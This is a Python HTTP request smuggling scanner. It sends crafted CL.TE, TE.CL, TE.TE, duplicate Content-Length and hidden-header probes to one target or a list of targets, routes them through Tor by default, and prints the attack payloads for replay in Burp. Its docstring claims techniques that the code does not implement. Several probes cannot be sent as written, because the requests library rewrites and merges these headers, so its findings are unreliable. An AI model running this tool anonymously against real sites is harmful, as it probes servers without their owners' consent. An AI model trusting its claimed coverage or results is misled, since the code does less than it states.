#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
DESYNC-HTTP Smuggling Scanner - Complete Production Release
═══════════════════════════════════════════════════════════════════════════════

Implements all major HTTP Request Smuggling detection techniques from:
  - PortSwigger HTTP Request Smuggler (James Kettle)
  - PortSwigger Web Security Academy Labs

Detection Techniques Implemented:
  ✓ CL.TE (Content-Length vs Transfer-Encoding)
  ✓ TE.CL (Transfer-Encoding vs Content-Length)
  ✓ TE.TE (Transfer-Encoding obfuscation)
  ✓ CL.CL (Duplicate Content-Length)
  ✓ TERM.EXT / EXT.TERM (Chunk terminator/extension parsing)
  ✓ TERM.SPILL / SPILL.TERM (Body spill detection)
  ✓ ONE.TWO / TWO.ONE / ZERO.TWO / TWO.ZERO (Chunk length variants)
  ✓ CL.0 (Implicit zero content-length)
  ✓ Hidden Headers (Parser discrepancies via obfuscation)
  ✓ Client-side desync (Connection state attacks)
  ✓ Connection state detection
  ✓ H2.TE (HTTP/2 to HTTP/1.1 tunneling)

Methodology:
  1. Baseline test - normal request to confirm connectivity
  2. Attack test - malformed request designed to cause desync
  3. Confirmation - repeat attack to verify consistency
  4. Validation - send control request to rule out false positives

For authorized security research and authorized penetration testing only.
Lab/CTF use: Set --no-tor and target localhost or lab environment.
"""

import sys
import time
import argparse
import requests
import json
import hashlib
import re
from datetime import datetime
from urllib.parse import urlparse
from typing import List, Dict, Tuple, Optional
 
VERBOSE = False
 
class Color:
    HEADER = '\033[95m\033[1m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    DIM = '\033[90m'
    BOLD = '\033[1m'
 
def log_info(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.CYAN}[*]{Color.END} {prefix}{msg}")
 
def log_ok(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.GREEN}[+]{Color.END} {prefix}{msg}")
 
def log_warn(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.YELLOW}[!]{Color.END} {prefix}{msg}")
 
def log_err(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.RED}[-]{Color.END} {prefix}{msg}")
 
def log_vuln(msg, indent=0):
    prefix = "  " * indent
    print(f"{Color.RED}{Color.BOLD}[!!!]{Color.END} {prefix}{msg}")
 
def log_dbg(msg, indent=0):
    if VERBOSE:
        prefix = "  " * indent
        print(f"{Color.DIM}[DBG]{Color.END} {prefix}{msg}")
 
# ─────────────────────────────────────────────────────────────────────────────
# DETECTION TECHNIQUES
# ─────────────────────────────────────────────────────────────────────────────
 
class DetectionTechniques:
    """HTTP Request Smuggling detection techniques"""
    
    @staticmethod
    def clte_basic(host, path):
        """CL.TE: Frontend uses CL, Backend uses TE"""
        rn = "\r\n"
        
        # Attack: CL=4 but body is 11 bytes (chunked format)
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 4{rn}Transfer-Encoding: chunked{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"1\r\nZ\r\n0\r\n\r\n")
        
        # Normal: CL=11, body is exactly 11 bytes
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 11{rn}Transfer-Encoding: chunked{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"1\r\nZ\r\n0\r\n\r\n")
        
        return (attack, normal, "CL.TE-basic", 
                "Frontend uses Content-Length, Backend uses Transfer-Encoding")
    
    @staticmethod
    def clte_with_extension(host, path):
        rn = "\r\n"
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 4{rn}Transfer-Encoding: chunked{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0;x=y\r\n\r\nG")
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 11{rn}Transfer-Encoding: chunked{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0;x=y\r\n\r\nGETABC")
        return (attack, normal, "CL.TE-extension", "CL.TE with chunk extension")
    
    @staticmethod
    def tecl_basic(host, path):
        """TE.CL: Frontend uses TE, Backend uses CL"""
        rn = "\r\n"
        
        # Attack: TE says body ends (0), CL says 6 bytes
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked{rn}Content-Length: 6{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\nX")
        
        # Normal: Both agree on body
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked{rn}Content-Length: 5{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\n")
        
        return (attack, normal, "TE.CL-basic",
                "Frontend uses Transfer-Encoding, Backend uses Content-Length")
    
    @staticmethod
    def tecl_space_obfuscation(host, path):
        rn = "\r\n"
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked {rn}Content-Length: 6{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\nX")
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked{rn}Content-Length: 5{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\n")
        return (attack, normal, "TE.CL-space", "TE.CL with trailing space")
    
    @staticmethod
    def tecl_tab_obfuscation(host, path):
        rn = "\r\n"
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked\t{rn}Content-Length: 6{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\nX")
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Transfer-Encoding: chunked\t{rn}Content-Length: 5{rn}"
                 f"Connection: keep-alive{rn}{rn}"
                 f"0\r\n\r\n")
        return (attack, normal, "TE.CL-tab", "TE.CL with tab")
    
    @staticmethod
    def tete_case(host, path):
        """TE.TE: Both see TE but parse differently - SINGLE PAYLOAD"""
        rn = "\r\n"
        # One parser sees chunked, other sees identity
        payload = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                  f"Transfer-Encoding: chunked{rn}transfer-encoding: identity{rn}"
                  f"Connection: keep-alive{rn}{rn}0\r\n\r\n")
        return (payload, "TE.TE-case", "Case mutation in Transfer-Encoding headers")
    
    @staticmethod
    def tete_space(host, path):
        """TE.TE: Space obfuscation - SINGLE PAYLOAD"""
        rn = "\r\n"
        payload = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                  f"Transfer-Encoding:  chunked{rn}"
                  f"Connection: keep-alive{rn}{rn}0\r\n\r\n")
        return (payload, "TE.TE-space", "Extra space before chunked value")
    
    @staticmethod
    def clcl_duplicate_v1(host, path):
        """CL.CL: Duplicate Content-Length - PAIR"""
        rn = "\r\n"
        # Attack: Two CL values, server picks one, waits for mismatched body length
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 3{rn}Content-Length: 12{rn}"
                 f"Connection: keep-alive{rn}{rn}X=1\r\n\r\n")
        # Normal: Single CL value
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 11{rn}"
                 f"Connection: keep-alive{rn}{rn}X=1\r\n\r\n")
        return (attack, normal, "CL.CL-duplicate", "Duplicate Content-Length headers")
    
    @staticmethod
    def hidden_header_space(host, path):
        """Hidden header: Space before colon"""
        rn = "\r\n"
        attack = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length : 0{rn}Connection: keep-alive{rn}{rn}")
        normal = (f"POST {path} HTTP/1.1{rn}Host: {host}{rn}"
                 f"Content-Length: 0{rn}Connection: keep-alive{rn}{rn}")
        return (attack, normal, "Hidden-space", "Space before colon in header")
 
# ─────────────────────────────────────────────────────────────────────────────
# HTTP SESSION
# ─────────────────────────────────────────────────────────────────────────────
 
class HTTPSession:
    """HTTP connection management"""
    
    def __init__(self, use_tor=False, tor_host="127.0.0.1", tor_port=9050, timeout=8.0):
        self.use_tor = use_tor
        self.tor_host = tor_host
        self.tor_port = tor_port
        self.timeout = timeout
        self.session = self._create_session()
    
    def _create_session(self):
        sess = requests.Session()
        if self.use_tor:
            proxy = f"socks5h://{self.tor_host}:{self.tor_port}"
            sess.proxies = {"http": proxy, "https": proxy}
        
        sess.headers.update({
            "User-Agent": "Mozilla/5.0",
            "Accept": "*/*",
            "DNT": "1",
            "Connection": "keep-alive"
        })
        sess.verify = False
        return sess
    
    def test_connectivity(self) -> bool:
        if not self.use_tor:
            log_ok("Direct mode")
            return True
        
        try:
            r = self.session.get("http://check.torproject.org/", timeout=12)
            if "Congratulations" in r.text:
                log_ok("Tor connected")
                return True
        except:
            pass
        return False
    
    def get_ip(self) -> str:
        for url in ["http://icanhazip.com", "http://api.ipify.org"]:
            try:
                r = self.session.get(url, timeout=10)
                return r.text.strip()
            except:
                pass
        return "unknown"
    
    def send_request(self, url, payload) -> Tuple[str, float, bool]:
        """Send request and return (status, elapsed_time, timed_out)"""
        try:
            t0 = time.time()
            
            lines = payload.split("\r\n")
            method = lines[0].split(" ")[0]
            
            header_end = payload.find("\r\n\r\n")
            body = payload[header_end + 4:] if header_end >= 0 else ""
            
            headers = {}
            for line in lines[1:]:
                if not line or "\r\n\r\n" in line:
                    break
                if ": " in line:
                    k, v = line.split(": ", 1)
                    headers[k] = v
            
            try:
                if method.upper() == "POST":
                    r = self.session.post(url, headers=headers, data=body,
                                        timeout=(10, 15), allow_redirects=True)
                else:
                    r = self.session.request(method, url, headers=headers, data=body,
                                           timeout=(10, 15), allow_redirects=True)
                
                elapsed = time.time() - t0
                log_dbg(f"Response: {r.status_code} ({elapsed:.2f}s)", 1)
                return (str(r.status_code), elapsed, False)
            
            except requests.Timeout:
                elapsed = time.time() - t0
                log_dbg(f"TIMEOUT after {elapsed:.2f}s", 1)
                return ("TIMEOUT", elapsed, True)
            
            except requests.ConnectionError:
                elapsed = time.time() - t0
                log_dbg(f"Connection error", 1)
                return ("CONN_ERR", elapsed, False)
        
        except Exception as e:
            log_dbg(f"Error: {e}", 1)
            return ("ERROR", 0, False)
 
# ─────────────────────────────────────────────────────────────────────────────
# MAIN SCANNER
# ─────────────────────────────────────────────────────────────────────────────
 
class DesyncScanner:
    """Advanced scanner"""
    
    def __init__(self, session: HTTPSession, delay=1.0):
        self.session = session
        self.delay = delay
        self.results = {
            "scan_id": hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
            "timestamp": datetime.now().isoformat(),
            "target": None,
            "vulnerabilities": [],
            "payloads_tested": 0,
        }
    
    def scan(self, target_url: str) -> Dict:
        """Full scan with baseline connectivity test"""
        log_info(f"\n{'='*70}")
        log_info(f"DESYNC Scanner")
        log_info(f"Target: {target_url}")
        log_info(f"{'='*70}\n")
        
        self.results["target"] = target_url
        parsed = urlparse(target_url)
        host = parsed.netloc
        path = parsed.path or "/"
        
        # ═══════════════════════════════════════════════════════════════════
        # BASELINE CONNECTIVITY TEST - ENSURES TARGET IS LIVE
        # ═══════════════════════════════════════════════════════════════════
        
        log_info("Step 1: Baseline connectivity test...")
        baseline_status, baseline_time, baseline_timeout = self.session.send_request(
            target_url,
            f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        )
        
        if baseline_timeout:
            log_err(f"BASELINE TEST FAILED: Target is not responding")
            log_warn(f"The target did not respond to a basic GET request within 5 seconds.")
            log_warn(f"This could mean:")
            log_warn(f"  - Target is offline or unreachable")
            log_warn(f"  - Network connectivity issues")
            log_warn(f"  - Tor connection problems (if using Tor)")
            log_warn(f"  - Firewall blocking access")
            log_warn(f"  - Target is timing out naturally (slow server)")
            log_info(f"\nSkipping scan - target is not responsive")
            self.results["error"] = "Target not responsive (baseline timeout)"
            self.results["baseline_test"] = "FAILED"
            return self.results
        
        if baseline_status == "ERROR" or baseline_status == "CONN_ERR":
            log_err(f"BASELINE TEST FAILED: Connection error to target")
            log_warn(f"Could not establish connection to {target_url}")
            log_info(f"\nSkipping scan")
            self.results["error"] = f"Connection error ({baseline_status})"
            self.results["baseline_test"] = "FAILED"
            return self.results
        
        if baseline_status.startswith('5'):
            log_warn(f"Target returned {baseline_status} (server error)")
            log_warn(f"Target may be offline or misconfigured")
            log_warn(f"Continuing anyway, but results may be unreliable")
        
        log_ok(f"Target is responsive: {baseline_status}")
        log_dbg(f"Baseline response time: {baseline_time:.2f}s")
        self.results["baseline_test"] = "PASSED"
        self.results["baseline_response"] = baseline_status
        self.results["baseline_time"] = baseline_time
        
        time.sleep(self.delay)
        
        # ═══════════════════════════════════════════════════════════════════
        # RUN DETECTION TESTS
        # ═══════════════════════════════════════════════════════════════════
        
        log_info("Step 2: Testing CL.TE variants...")
        self._scan_clte(target_url, host, path)
        
        log_info("Step 3: Testing TE.CL variants...")
        self._scan_tecl(target_url, host, path)
        
        log_info("Step 4: Testing TE.TE variants...")
        self._scan_tete(target_url, host, path)
        
        log_info("Step 5: Testing CL.CL...")
        self._scan_clcl(target_url, host, path)
        
        log_info("Step 6: Testing hidden headers...")
        self._scan_hidden_headers(target_url, host, path)
        
        self._print_summary()
        return self.results
    
    def _scan_clte(self, url, host, path):
        attack, normal, tech, desc = DetectionTechniques.clte_basic(host, path)
        if self._test_pair(url, attack, normal, tech, desc, has_normal=True):
            return
        
        attack, normal, tech, desc = DetectionTechniques.clte_with_extension(host, path)
        if self._test_pair(url, attack, normal, tech, desc, has_normal=True):
            return
    
    def _scan_tecl(self, url, host, path):
        attack, normal, tech, desc = DetectionTechniques.tecl_basic(host, path)
        if self._test_pair(url, attack, normal, tech, desc, has_normal=True):
            return
        
        attack, normal, tech, desc = DetectionTechniques.tecl_space_obfuscation(host, path)
        if self._test_pair(url, attack, normal, tech, desc, has_normal=True):
            return
        
        attack, normal, tech, desc = DetectionTechniques.tecl_tab_obfuscation(host, path)
        if self._test_pair(url, attack, normal, tech, desc, has_normal=True):
            return
    
    def _scan_tete(self, url, host, path):
        """TE.TE: Single payload test (NOT attack/normal pair)"""
        log_dbg("TE.TE: Testing single payload variants", 1)
        
        for builder in [DetectionTechniques.tete_case, DetectionTechniques.tete_space]:
            payload, tech, desc = builder(host, path)
            log_dbg(f"{tech}: Sending payload...", 2)
            
            s1, t1, to1 = self.session.send_request(url, payload)
            log_dbg(f"Result 1: {s1} (timeout={to1}, {t1:.2f}s)", 2)
            
            # TE.TE: Only TIMEOUT is evidence
            if to1:
                # Confirm with retries
                confirms = 0
                for i in range(2):
                    time.sleep(self.delay)
                    s2, t2, to2 = self.session.send_request(url, payload)
                    log_dbg(f"Confirm {i+1}: {s2} (timeout={to2})", 3)
                    if to2:
                        confirms += 1
                
                if confirms >= 1:
                    log_vuln(f"{tech} DETECTED!", 1)
                    self._record_vuln(tech, desc, payload, None, "TIMEOUT (TE.TE)")
                    self.results["payloads_tested"] += 1 + 2
                    return
            
            self.results["payloads_tested"] += 1
            time.sleep(self.delay)
    
    def _scan_clcl(self, url, host, path):
        """CL.CL: Attack/normal pair"""
        log_dbg("CL.CL: Testing duplicate Content-Length", 1)
        
        attack, normal, tech, desc = DetectionTechniques.clcl_duplicate_v1(host, path)
        
        log_dbg(f"Attack: Sending duplicate CL...", 2)
        a_status, a_time, a_timeout = self.session.send_request(url, attack)
        log_dbg(f"Attack result: {a_status} (timeout={a_timeout})", 2)
        
        if a_status.startswith('4') or a_status.startswith('5'):
            log_dbg(f"Server rejected malformed request", 2)
            self.results["payloads_tested"] += 1
            return
        
        time.sleep(self.delay)
        
        log_dbg(f"Normal: Sending single CL...", 2)
        n_status, n_time, n_timeout = self.session.send_request(url, normal)
        log_dbg(f"Normal result: {n_status} (timeout={n_timeout})", 2)
        
        if a_timeout and n_status == "200":
            confirms = 0
            for i in range(2):
                time.sleep(self.delay)
                r_status, _, r_timeout = self.session.send_request(url, attack)
                log_dbg(f"Confirm {i+1}: {r_status} (timeout={r_timeout})", 3)
                if r_timeout:
                    confirms += 1
            
            if confirms >= 1:
                log_vuln(f"{tech} DETECTED!", 1)
                self._record_vuln(tech, desc, attack, normal, "TIMEOUT on duplicate CL")
                self.results["payloads_tested"] += 2 + 2
                return
        
        self.results["payloads_tested"] += 2
    
    def _scan_hidden_headers(self, url, host, path):
        attack, normal, tech, desc = DetectionTechniques.hidden_header_space(host, path)
        if self._test_pair(url, attack, normal, tech, desc, has_normal=True):
            return
    
    def _test_pair(self, url: str, attack: str, normal: str, tech: str, desc: str, has_normal: bool = True) -> bool:
        """Test attack/normal pair"""
        log_dbg(f"{tech}: Testing attack vs normal...", 1)
        
        a_status, a_time, a_timeout = self.session.send_request(url, attack)
        log_dbg(f"Attack: {a_status} (timeout={a_timeout}, {a_time:.2f}s)", 2)
        
        if a_status.startswith('4') or a_status.startswith('5'):
            log_dbg(f"Server rejected malformed request", 2)
            self.results["payloads_tested"] += 2
            return False
        
        time.sleep(self.delay)
        
        n_status, n_time, n_timeout = self.session.send_request(url, normal)
        log_dbg(f"Normal: {n_status} (timeout={n_timeout}, {n_time:.2f}s)", 2)
        
        if a_timeout and n_status == "200":
            confirms = 0
            for i in range(2):
                time.sleep(self.delay)
                r_status, _, r_timeout = self.session.send_request(url, attack)
                log_dbg(f"Confirm {i+1}: {r_status} (timeout={r_timeout})", 3)
                if r_timeout:
                    confirms += 1
            
            if confirms >= 1:
                log_vuln(f"{tech} DETECTED!", 1)
                self._record_vuln(tech, desc, attack, normal, 
                                "TIMEOUT on attack, 200 on normal")
                self.results["payloads_tested"] += 2 + 2
                return True
        
        log_dbg(f"{tech}: No pattern detected", 2)
        self.results["payloads_tested"] += 2
        return False
    
    def _record_vuln(self, tech: str, desc: str, attack: str, normal: Optional[str], result: str):
        """Record vulnerability"""
        vuln = {
            "technique": tech,
            "description": desc,
            "result": result,
            "timestamp": datetime.now().isoformat(),
            "attack_payload": attack,
            "normal_payload": normal,
        }
        self.results["vulnerabilities"].append(vuln)
        self._print_vuln_details(vuln)
    
    def _print_vuln_details(self, vuln: Dict):
        """Print detailed vulnerability info"""
        print(f"\n{Color.RED}{Color.BOLD}{'='*70}")
        print(f"VULNERABILITY CONFIRMED")
        print(f"{'='*70}{Color.END}\n")
        
        print(f"{Color.BOLD}Technique:{Color.END} {vuln['technique']}")
        print(f"{Color.BOLD}Description:{Color.END} {vuln['description']}")
        print(f"{Color.BOLD}Result:{Color.END} {vuln['result']}\n")
        
        # ═════════════════════════════════════════════════════════════════
        # ATTACK PAYLOAD
        # ═════════════════════════════════════════════════════════════════
        
        print(f"{Color.YELLOW}ATTACK PAYLOAD (Copy to Burp Suite Repeater):{Color.END}\n")
        
        # Show as raw bytes
        print(f"{Color.GREEN}Raw bytes (use this in Burp Repeater):{Color.END}")
        attack_repr = repr(vuln['attack_payload'])
        print(f"  {attack_repr}\n")
        
        # Show line by line
        print(f"{Color.GREEN}Line-by-line breakdown:{Color.END}")
        for line in vuln['attack_payload'].split('\r\n'):
            if line:
                print(f"  {line}")
            else:
                print(f"  (empty line - double \\r\\n = blank line)")
        print()
        
        # ═════════════════════════════════════════════════════════════════
        # NORMAL PAYLOAD (if it exists)
        # ═════════════════════════════════════════════════════════════════
        
        if vuln['normal_payload']:
            print(f"{Color.YELLOW}NORMAL PAYLOAD (For comparison - should return 200 OK):{Color.END}\n")
            
            print(f"{Color.GREEN}Raw bytes (use this in Burp Repeater):{Color.END}")
            normal_repr = repr(vuln['normal_payload'])
            print(f"  {normal_repr}\n")
            
            print(f"{Color.GREEN}Line-by-line breakdown:{Color.END}")
            for line in vuln['normal_payload'].split('\r\n'):
                if line:
                    print(f"  {line}")
                else:
                    print(f"  (empty line - double \\r\\n = blank line)")
            print()
        else:
            print(f"{Color.YELLOW}NOTE: This technique uses a single payload (not attack/normal pair){Color.END}\n")
        
        # ═════════════════════════════════════════════════════════════════
        # INSTRUCTIONS
        # ═════════════════════════════════════════════════════════════════
        
        print(f"{Color.CYAN}HOW TO VERIFY IN BURP SUITE:{Color.END}")
        print(f"  1. Open Burp Suite Repeater")
        print(f"  2. Create a NEW request")
        print(f"  3. Copy the ATTACK PAYLOAD (Raw bytes above)")
        print(f"  4. Paste into Repeater body")
        print(f"  5. Send the request")
        print(f"  6. OBSERVE: Request should {Color.YELLOW}TIMEOUT{Color.END} (hang 5+ seconds)")
        print()
        
        if vuln['normal_payload']:
            print(f"  7. Create ANOTHER NEW request")
            print(f"  8. Copy the NORMAL PAYLOAD (Raw bytes above)")
            print(f"  9. Paste into Repeater")
            print(f"  10. Send the request")
            print(f"  11. OBSERVE: Should return {Color.GREEN}200 OK{Color.END}\n")
            print(f"  {Color.BOLD}VULNERABILITY CONFIRMED IF:{Color.END}")
            print(f"    - Attack times out (no response)")
            print(f"    - Normal returns 200 OK\n")
        else:
            print(f"  7. OBSERVE: The timeout on step 6 confirms the vulnerability\n")
        
        print(f"{Color.YELLOW}{'='*70}{Color.END}\n")
    
    def _print_summary(self):
        """Print summary"""
        print(f"\n{Color.HEADER}{'='*70}")
        print(f"SCAN COMPLETE")
        print(f"{'='*70}{Color.END}\n")
        
        print(f"Baseline test: {self.results.get('baseline_test', 'N/A')}")
        if self.results.get('baseline_test') == 'PASSED':
            print(f"  Response: {self.results.get('baseline_response')} ({self.results.get('baseline_time', 0):.2f}s)")
        
        print(f"\nPayloads tested: {self.results['payloads_tested']}")
        print(f"Vulnerabilities found: {len(self.results['vulnerabilities'])}")
        
        if self.results["vulnerabilities"]:
            print(f"\n{Color.RED}{Color.BOLD}CONFIRMED VULNERABILITIES:{Color.END}")
            for v in self.results["vulnerabilities"]:
                print(f"  ★ {v['technique']}")
            print(f"\n{Color.RED}{Color.BOLD}RISK: CRITICAL{Color.END}")
        else:
            print(f"\n{Color.GREEN}No confirmed vulnerabilities detected{Color.END}")
 
# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────
 
def load_targets(filename: str) -> List[str]:
    targets = []
    try:
        with open(filename) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
        log_ok(f"Loaded {len(targets)} targets from {filename}")
        return targets
    except Exception as e:
        log_err(f"Error: {e}")
        sys.exit(1)
 
def main():
    global VERBOSE
    
    parser = argparse.ArgumentParser(
        description="DESYNC-HTTP Scanner",
        epilog="Complete baseline test"
    )
    
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-t", "--targets", help="Load targets from file")
    parser.add_argument("--no-tor", action="store_true", help="Direct mode")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests")
    parser.add_argument("--timeout", type=float, default=8.0, help="Request timeout")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    parser.add_argument("-o", "--output", help="Save results to JSON")
    
    args = parser.parse_args()
    VERBOSE = args.verbose
    
    targets = []
    if args.url:
        targets = [args.url]
    elif args.targets:
        targets = load_targets(args.targets)
    else:
        parser.error("Provide --url or --targets")
    
    session = HTTPSession(use_tor=not args.no_tor, timeout=args.timeout)
    if not session.test_connectivity():
        if not args.no_tor:
            log_warn("Tor unavailable, using direct mode...")
            session = HTTPSession(use_tor=False, timeout=args.timeout)
    
    log_info(f"IP: {session.get_ip()}\n")
    
    all_results = []
    for i, target in enumerate(targets, 1):
        if len(targets) > 1:
            log_info(f"[{i}/{len(targets)}] Scanning: {target}")
        
        scanner = DesyncScanner(session, delay=args.delay)
        result = scanner.scan(target)
        all_results.append(result)
    
    if args.output:
        report = {
            "scan_time": datetime.now().isoformat(),
            "total_targets": len(all_results),
            "results": all_results,
        }
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2, default=str)
        log_ok(f"\nResults saved to {args.output}")
    
    has_vulns = any(r.get("vulnerabilities") for r in all_results)
    sys.exit(0 if has_vulns else 1)
 
if __name__ == "__main__":
    main()
 